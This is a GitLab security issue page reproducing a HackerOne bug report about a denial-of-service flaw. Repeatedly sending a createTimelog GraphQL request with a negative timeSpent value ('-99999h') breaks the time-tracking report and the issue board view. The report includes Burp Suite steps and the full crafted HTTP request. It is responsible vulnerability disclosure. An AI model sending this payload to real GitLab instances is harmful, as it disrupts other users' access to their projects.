=== Content from gitlab.com_bd42cbd9_20250115_090020.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Unvalidated `timeSpent` value in POST /api/graphql `createTimelog` operation leads to unable to load issues on Issue board

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2053154](https://hackerone.com/reports/2053154)** by `toukakirishima` on 2023-07-06, assigned to [@cmaxim](/cmaxim "Costel Maxim"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

I found a DOS vulnerability when add ***Time spent*** on Issue, as an attacker I can make the victim unable to see the Time tracking report and also see the Issue on the Board.

Normally you can see Time tracking report and Issue on Board.

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/79190a40cc2d2137991f6ce5f08e1e6788f7ab44/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f65646465373039372d623462662d343039632d623061322d3830636162656661383664642f696d6167652e706e67)

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/eab142b8ce3ff48ef55402fc27af9d504f6f031f/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30396566386236652d623831372d343737362d393835352d3262643338643866303034652f696d6167652e706e67)

But as an attacker I can make the victim unable to see the Time tracking report and also see the Issue on the Board.

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/59c8e4c026008ae2ff71c13d36f70398ea8dc00a/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f36363432316163322d663035302d346364642d386266302d6632656333623537373938382f696d6167652e706e67)

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/5f2f0b630f2efd5d96efd5c0bb9a7c43a34ce527/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33353934373431382d396161332d346233662d393932362d3934316232623165373538332f696d6167652e706e67)

Let's say Touka Attacker is the attacker and Touka Kirishima is the victim.

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/63cf461d2e75c03228370d8098b413bc0f7388c6/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33356366636638622d363164642d346563302d396637382d3965636337666632656330652f696d6167652e706e67)

And Touka Kirishima (victim) made Issues.

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/473261e54545130515fd62311de8e7743ff1cb7a/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f35626437343833302d373863382d343163622d616232652d3930353363313435333537332f696d6167652e706e67)

##### Steps to reproduce

1. Go to Issues

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/57ec241332801074ce7a56c3cc3ed74f44c2859b/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f34613034613834362d323235662d343436652d383637332d3236666266383661393531642f696d6167652e706e67)

2. Add Time spent

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/1c02ca69207d05502f3ce96645706d17da2b4da9/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f37623066623935302d316431352d346362392d393235662d3135383831616638313132652f696d6167652e706e67)

3. Click save and makesure burpsuite is on. You will see request like following, Example :

```
POST /api/graphql HTTP/2
Host: gitlab.com
Cookie: x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: id,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://gitlab.com/toukakirishima/testpoc/-/issues/23
Content-Type: application/json
X-Csrf-Token: x
X-Gitlab-Feature-Category: team_planning
Content-Length: 1234
Origin: https://gitlab.com
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

[{"operationName":"createTimelog","variables":{"input":{"timeSpent":"1","spentAt":"2023-07-06T22:32:42+0700","summary":"","issuableId":"gid://gitlab/Issue/130410026"}},"query":"mutation createTimelog($input: TimelogCreateInput!) {\n  timelogCreate(input: $input) {\n    errors\n    timelog {\n      id\n      issue {\n        ...IssueTimeTrackingFragment\n        __typename\n      }\n      mergeRequest {\n        ...MergeRequestTimeTrackingFragment\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment IssueTimeTrackingFragment on Issue {\n  __typename\n  id\n  humanTotalTimeSpent\n  totalTimeSpent\n  timelogs {\n    nodes {\n      ...TimelogFragment\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment TimelogFragment on Timelog {\n  __typename\n  id\n  timeSpent\n  user {\n    id\n    name\n    __typename\n  }\n  spentAt\n  note {\n    id\n    body\n    __typename\n  }\n  summary\n  userPermissions {\n    adminTimelog\n    __typename\n  }\n}\n\nfragment MergeRequestTimeTrackingFragment on MergeRequest {\n  __typename\n  id\n  humanTotalTimeSpent\n  totalTimeSpent\n  timelogs {\n    nodes {\n      ...TimelogFragment\n      __typename\n    }\n    __typename\n  }\n}\n"}]
```

4. Send to Repeater
5. Change *timeSpent*. Example :

```
POST /api/graphql HTTP/2
Host: gitlab.com
Cookie: x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: id,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://gitlab.com/toukakirishima/testpoc/-/issues/23
Content-Type: application/json
X-Csrf-Token: x
X-Gitlab-Feature-Category: team_planning
Content-Length: 1234
Origin: https://gitlab.com
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

[{"operationName":"createTimelog","variables":{"input":{"timeSpent":"-99999h","spentAt":"2023-07-06T22:32:42+0700","summary":"","issuableId":"gid://gitlab/Issue/130410026"}},"query":"mutation createTimelog($input: TimelogCreateInput!) {\n  timelogCreate(input: $input) {\n    errors\n    timelog {\n      id\n      issue {\n        ...IssueTimeTrackingFragment\n        __typename\n      }\n      mergeRequest {\n        ...MergeRequestTimeTrackingFragment\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment IssueTimeTrackingFragment on Issue {\n  __typename\n  id\n  humanTotalTimeSpent\n  totalTimeSpent\n  timelogs {\n    nodes {\n      ...TimelogFragment\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment TimelogFragment on Timelog {\n  __typename\n  id\n  timeSpent\n  user {\n    id\n    name\n    __typename\n  }\n  spentAt\n  note {\n    id\n    body\n    __typename\n  }\n  summary\n  userPermissions {\n    adminTimelog\n    __typename\n  }\n}\n\nfragment MergeRequestTimeTrackingFragment on MergeRequest {\n  __typename\n  id\n  humanTotalTimeSpent\n  totalTimeSpent\n  timelogs {\n    nodes {\n      ...TimelogFragment\n      __typename\n    }\n    __typename\n  }\n}\n"}]
```

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/9258b6033400b141150e9bac018b6299de2ed6dc/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f65323437656163632d643330622d346365322d623733332d6331643332363937356537332f696d6167652e706e67)

6. Click Send until the Response HTTP/2 500 Internal Server Error appears (usually 5 times when you click Send)

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/9dcc01ab5d2ac6df096f4c4d96e0907405c08bfd/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30363730616263392d656535622d343662302d383132332d6637653531623865313162322f696d6167652e706e67)

7. Reload the page and you unable to see the Time tracking report and see Issues on the Board

*POV from Attacker*

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/715cf559b5ce763b33f46532f1adba726bbb89e7/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f32646534643534382d346438642d343738322d623836382d6266616139623763353030382f696d6167652e706e67)

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/ce25d34b833194b6243c172bbd195da3ed7cb79e/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f65383938323037642d333037642d343130302d383165372d3030316164386165316463622f696d6167652e706e67)

*POV from Victim*

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/d129117f301a5aee43a021afa26626086b0b4055/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33616463393634362d646363642d343036332d616437662d6331393638663531386230362f696d6167652e706e67)

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/dc33b6f341b97b6329aeb70b9e2b48912e2f3eb9/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64646132636463342d343765662d346361392d623666612d3539646166376439626234342f696d6167652e706e67)

##### POC

[bandicam\_2023-07-06\_22-42-12-864.mp4](https://user-content.gitlab-static.net/f02cc74cd420c5f663f6cc26e338b8501d1befbd/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61623163373532662d383333662d343830652d616132642d6533326234393435656137322f62616e646963616d5f323032332d30372d30365f32322d34322d31322d3836342e6d7034 "Download 'bandicam_2023-07-06_22-42-12-864.mp4'")

##### Output of checks

This bug happens on GitLab.com

#### Impact

* Attacker can make victim unable to see the Time tracking report.
* Attacker can make victim unable to see Issues on the Board.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [image.png](https://h1.sec.gitlab.net/a/edde7097-b4bf-409c-b0a2-80cabefa86dd/image.png)
* [image.png](https://h1.sec.gitlab.net/a/09ef8b6e-b817-4776-9855-2bd38d8f004e/image.png)
* [image.png](https://h1.sec.gitlab.net/a/66421ac2-f050-4cdd-8bf0-f2ec3b577988/image.png)
* [image.png](https://h1.sec.gitlab.net/a/35947418-9aa3-4b3f-9926-941b2b1e7583/image.png)
* [image.png](https://h1.sec.gitlab.net/a/35cfcf8b-61dd-4ec0-9f78-9ecc7ff2ec0e/image.png)
* [image.png](https://h1.sec.gitlab.net/a/5bd74830-78c8-41cb-ab2e-9053c1453573/image.png)
* [image.png](https://h1.sec.gitlab.net/a/4a04a846-225f-446e-8673-26fbf86a951d/image.png)
* [image.png](https://h1.sec.gitlab.net/a/7b0fb950-1d15-4cb9-925f-15881af8112e/image.png)
* [image.png](https://h1.sec.gitlab.net/a/e247eacc-d30b-4ce2-b733-c1d326975e73/image.png)
* [image.png](https://h1.sec.gitlab.net/a/0670abc9-ee5b-46b0-8123-f7e51b8e11b2/image.png)
* [image.png](https://h1.sec.gitlab.net/a/e898207d-307d-4100-81e7-001ad8ae1dcb/image.png)
* [image.png](https://h1.sec.gitlab.net/a/2de4d548-4d8d-4782-b868-bfaa9b7c5008/image.png)
* [image.png](https://h1.sec.gitlab.net/a/3adc9646-dccd-4063-ad7f-c1968f518b06/image.png)
* [image.png](https://h1.sec.gitlab.net/a/dda2cdc4-47ef-4ca9-b6fa-59daf7d9bb44/image.png)
* [bandicam\_2023-07-06\_22-42-12-864.mp4](https://h1.sec.gitlab.net/a/ab1c752f-833f-480e-aa2d-e32b4945ea72/bandicam_2023-07-06_22-42-12-864.mp4)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


